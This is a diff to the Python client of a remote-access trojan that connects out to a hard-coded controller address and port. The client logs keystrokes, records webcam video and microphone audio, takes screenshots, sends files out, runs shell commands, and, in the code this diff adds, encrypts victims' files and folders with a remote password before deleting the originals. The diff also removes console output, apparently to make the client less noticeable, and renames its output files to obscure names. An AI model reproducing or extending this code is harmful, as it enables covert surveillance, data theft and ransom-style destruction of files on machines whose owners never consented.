@@ -14,33 +14,118 @@ import numpy as np
 import cv2
 import pyaudio
 import wave
+import pyAesCrypt
 from tenacity import retry
 import platform
+from os import stat
 import threading
 import getpass
 def close():
     global s
     s.close()
     sys.exit()
+def encryptor():
+    global s
+    global buffer
+    buffer = 64 * 1024
+    Dfile=s.recv(4000)
+    file=Dfile.decode()
+   
+    key=s.recv(4000)
+    password=key.decode()
+    
+    if os.path.isfile(file):
+        try:
+            with open(file, "rb") as vfile:
+                with open(file+".aes","wb") as Efile:
+                    pyAesCrypt.encryptStream(vfile, Efile, password, buffer)
+            sucs="File encrypted successfully"
+            s.send(sucs.encode())
+            os.remove(file)
+        except:
+            err="could not encrypt file"
+            s.send(err.encode())
+    elif os.path.isdir(file):
+         
+            zipfile=shutil.make_archive(file,'zip',file)
+            dzip=file+".zip"
+            try:
+                with open(dzip,"rb") as vfile:
+                    with open(dzip+".aes","wb") as Efile:
+                        pyAesCrypt.encryptStream(vfile, Efile, password, buffer)
+                shutil.rmtree(file)
+                os.remove(dzip)
+                suc="File encrypted successfully"
+                s.send(suc.encode())
+            except:
+                err="could not encrypt file"
+                s.send(err.encode())
+def decryptor():
+    global s
+    global buffer
+    Dfile=s.recv(4000)
+    file=Dfile.decode()
+    fsize = stat(file).st_size
+
+    passw=s.recv(4000)
+    Key=passw.decode()
+
+    try:
+        t=file.rsplit('.', 1)[0]
+        if t.endswith("zip"):
+            with open(file, "rb") as vfile:
+                try:
+                    with open(t, "wb") as Efile:
+                            pyAesCrypt.decryptStream(vfile, Efile, Key, buffer, fsize)
+                    vfile.close()
+                    os.remove(file)
+                    f=t.rsplit(".",1)[0]
+                    shutil.unpack_archive(t,f,"zip")
+                    suc="File decrypted successfully"
+                    s.send(suc.encode())
+                    Efile.close()
+                    os.remove(t)
+                except ValueError:
+                    os.remove(file)
+                    err="An Error occured while decrypting file"
+                    s.send(err.encode())
+        else:
+            with open(file, "rb") as vfile:
+                try:
+                    with open(t, "wb") as Efile:
+                            pyAesCrypt.decryptStream(vfile, Efile, Key, buffer, fsize)
+                    vfile.close()
+                    os.remove(file)
+                    suc="File decrypted successfully"
+                    s.send(suc.encode())
+                except :
+                    os.remove(file)
+                    err="An Error occured while decrypting file"
+                    s.send(err.encode())
+
+            
+    except:
+        Err="Decryption was unsuccessful"
+        s.send(Err.encode())
 def keylog(): 
     def process_key_press(key):
             try:
                 current_key = '{0} pressed'.format(key)
             
-             
-                with open("___.txt","a+") as f:
+                
+                with open("__.txt","a+") as f:
                     
                     f.write(str(key)+".pressed'..'")
             except AttributeError:
                     f.write('>uk<')
-    def process_key_release(key):
+    def process_key_press2(key):
             try:
                 current_key = '{0} pressed'.format(key)       
-                with open("___.txt","a+") as f:
+                with open("__.txt","a+") as f:
                     f.write(str(key)+".released'..'")
             except AttributeError:
                 f.write("<uk>")
-    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press , on_release=process_key_release)
+    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press , on_release=process_key_press2)
     with keyboard_listener: 
         keyboard_listener.join()
 
@@ -54,37 +139,37 @@ def cd():
                os.chdir(file_path)
                volchanged="Changed volumes successfully"
                s.send(volchanged.encode())
-               print("cd 1")
+
               
        elif file_path.endswith(""):
                os.chdir(file_path)
                dirchanged="Changed directory successfully"
                s.send(file_path.encode())
-               print(dirchanged)
+
                
        else:
                os.chdir(file_path)
                dirchanged="Changed directory successfully"
                s.send(file_path.encode())
-               print(dirchanged)
+
                
     
     except:
        failed="could not cd into directory/volume"
        s.send(failed.encode())
-       print(failed)
-       print('cd 2')
+
+
        
 def grab():
     global s
     try:      
          file_rcv=s.recv(2000)
-         print("query received")
+
          file=file_rcv.decode()
-         print(file)
+
          if os.path.isdir(file):
                  Dir='Directory'
-                 print(Dir)
+                 
                  s.send(Dir.encode())
                  zipfile=shutil.make_archive(file,'zip',file)
                  file_size=os.path.getsize(file+'.zip')
@@ -92,16 +177,16 @@ def grab():
                  s.send(size.encode())
                  response=s.recv(1024)
                  if response.decode()[:1]=="y":
-                     print("file size %f"%file_size)
+                    
                      file_get=open(file+'.zip','rb')
                      file_data=file_get.read(file_size)
                      s.send(file_data)
                      file_get.close()
-                     print("filesent")
+                    
                      os.remove(file+".zip")
                  else:
                      s.recv(1024)
-                     print("releasing file...")
+                    
                    
          elif os.path.isfile(file):
                  Type='file'
@@ -109,27 +194,27 @@ def grab():
                  file_size=os.path.getsize(file)
                  size=str(file_size)
                  s.send(size.encode())
-                 print("file size %f"%file_size)
+                
                  response=s.recv(1024)
                  if response.decode()[:1]=="y":
                      file_get=open(file,'rb')
                      file_data=file_get.read(file_size)
                      s.send(file_data)
                      file_get.close()
-                     print("filesent")
+              
                  else:
                      s.recv(1024) 
-                     print("releasing file...")
+
                
          
          else : 
                  error="File not found here"
-                 print(error)
+
                  s.send(error.encode())
                  
     except:
          error="File not found"
-         print(error)
+
          s.send(error.encode())
        
 def audcap():
@@ -138,15 +223,15 @@ def audcap():
     capture_time=int(timerec.decode())
     try:
             chunk = 1024
-            sample_format = pyaudio.paInt16
+            sample_format = pyaudio.paInt16  
             channels = 2
             fs = 44100  
             seconds = capture_time
-            filename = "audrec.wav"
+            filename = "_.wav"
 
             p = pyaudio.PyAudio()  
 
-            print('Recording')
+       
 
             stream = p.open(format=sample_format,input_device_index=0,
                             channels=channels,
@@ -156,40 +241,37 @@ def audcap():
 
             frames = []  
 
-      
+
             for i in range(0, int(fs / chunk * seconds)):
                 data = stream.read(chunk,exception_on_overflow=False)
                 frames.append(data)
 
-             
+
             stream.stop_stream()
             stream.close()
-            
+
             p.terminate()
 
-            print('Finished recording')
-
-   
             wf = wave.open(filename, 'wb')
             wf.setnchannels(channels)
             wf.setsampwidth(p.get_sample_size(sample_format))
             wf.setframerate(fs)
             wf.writeframes(b''.join(frames))
             wf.close()
-            file_size=os.path.getsize('audrec.wav')
+            file_size=os.path.getsize('_.wav')
             size=str(file_size)
             s.send(size.encode())
             response=s.recv(1024)
             if response.decode()[:1]=="y":            
-                print("file size %f"%file_size)
-                file_get=open('audrec.wav','rb')
+           
+                file_get=open('_.wav','rb')
                 file_data=file_get.read(file_size)
                 s.send(file_data)
                 file_get.close()
-                print("filesent")
-                os.remove('audrec.wav')
+     
+                os.remove('_.wav')
             else:
-                os.remove("audrec.wav")
+                os.remove("_.wav")
             
 
     except:
@@ -202,46 +284,40 @@ def vidcap():
     try:
                                       
             cap = cv2.VideoCapture(0)
-    
-
-      
-            fourcc = cv2.VideoWriter_fourcc(*'XVID')
-            out = cv2.VideoWriter('vidrec.avi',fourcc,20.0,(640,480))
+            x= cap.get(cv2.CAP_PROP_FRAME_WIDTH);
+            y = cap.get(cv2.CAP_PROP_FRAME_HEIGHT);
+            fourcc = cv2.VideoWriter_fourcc(*'DIVX')
+            out = cv2.VideoWriter('_.mp4',fourcc,20.0,(int(x),int(y)))
             begin_time=time.time()
             while(int(time.time() - begin_time) < capture_time ):
                 ret, frame = cap.read()
                 if ret==True:
-                   
-
-                   
                     out.write(frame)
-            
-                  
                 else:
                     break
 
-           
+
             cap.release()
             out.release()
             cv2.destroyAllWindows()
-            file_size=os.path.getsize('vidrec.avi')
+            file_size=os.path.getsize('_.mp4')
             size=str(file_size)
             s.send(size.encode())
-            print("file size %f"%file_size)
+
             response=s.recv(1024)
             if response.decode()[:1]=="y":
-                file_get=open('vidrec.avi','rb')
+                file_get=open('_.mp4','rb')
                 file_data=file_get.read(file_size)
                 s.send(file_data)
                 file_get.close()
-                print("filesent")
-                os.remove('vidrec.avi')
+ 
+                os.remove('_.mp4')
             else:
-                os.remove('vidrec.avi')
+                os.remove('_.mp4')
            
     except:
             capfail="could not capture video"
-            print(capfail)
+        
             s.send(capfail.encode())
             
 def sysinfo():
@@ -262,18 +338,18 @@ def screenshot():
          file_size=os.path.getsize('scrimage.jpg')
          size=str(file_size)
          s.send(size.encode())
-         print("file size %f"%file_size)
+     
          file_get=open('scrimage.jpg','rb')
          file_data=file_get.read(file_size)
          s.send(file_data)
          file_get.close()
-         print("filesent")
+
          os.remove('scrimage.jpg')
         
         
     except:
          error="Image not found"
-         print(error)
+        
          s.send(error.encode())
          
 def upload():
@@ -282,12 +358,12 @@ def upload():
     filename=filenoun.decode()
     try:
             if filename.startswith('failed'):
-                    print("could not receive file")
+                    print(" ")
             else:    
                     check=s.recv(4000)
                     checked=check.decode()
                     size=int(checked)
-                    print(filename,size)
+                    
                     file=open(filename,'wb')
                     file_data=s.recv(1024)
                     full_data=len(file_data)
@@ -299,27 +375,24 @@ def upload():
                            full_data += len(file_data)
                            file.write(file_data)
                     received="file received"
-                    print(received)
+                    
                     s.send(received.encode())
     except:
             failed="could not receive file"
             s.send(failed.encode('utf-8'))
-            print(failed)
+           
 @retry
 def main():
     global s
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host="0.0.0.0"
-    port=0000
+    host="10.42.0.1"
+    port=740
     s.connect((host,port))
-    print("connecting...")
-    print("connected to server")
-    print("Online")
     while 1:
         while True:
             insydys_control=s.recv(4000)
             insydys_control=insydys_control.decode("utf-8")
-            print("...",insydys_control+"...")
+         
             if insydys_control[:5]=="close":
                 close()
                 break
@@ -347,19 +420,26 @@ def main():
             elif insydys_control[:6]=="upload":
                 upload()
                 break
+            elif insydys_control[:7]=="decrypt":
+                decryptor()
+                break
+            elif insydys_control[:7]=="encrypt":
+                encryptor()
+                break
             elif insydys_control[:6]=="keylog":
-
                 try:
-                     file_size=os.path.getsize('___.txt')
+                     file_size=os.path.getsize('__.txt')
                      size=str(file_size)
                      s.send(size.encode())
-                     print("file size %f"%file_size)
-                     file_get=open('___.txt','rb')
+                   
+                     file_get=open('__.txt','rb')
                      file_data=file_get.read(file_size)
                      s.send(file_data)
                      file_get.close()
-                     print("filesent")
-                     os.remove('___.txt')
+                   
+                     os.remove('__.txt')
+                     global m
+                     m.start()
                 except:
                      c="could not capture key strokes"
                      s.send(c.encode())
@@ -383,14 +463,14 @@ def main():
                         sh.kill()
                         filed=os.path.getsize('_.txt')
                         file_d=str(filed)
-                        print(filed)
+                     
                         s.send(file_d.encode())
-                        print("sent")
+
                         file=open('_.txt','rb')
                         output_data=file.read(filed)
                         s.send(output_data)
                         file.close()
-                        print(printo)
+ 
                         os.remove('_.txt')
                         break
                 except:
@@ -399,7 +479,7 @@ def main():
                         sh.kill()
                         break
 
-
+global m
 m=threading.Thread(name='keylog',target=keylog)
 m.setDaemon(True)
 if __name__=="__main__":
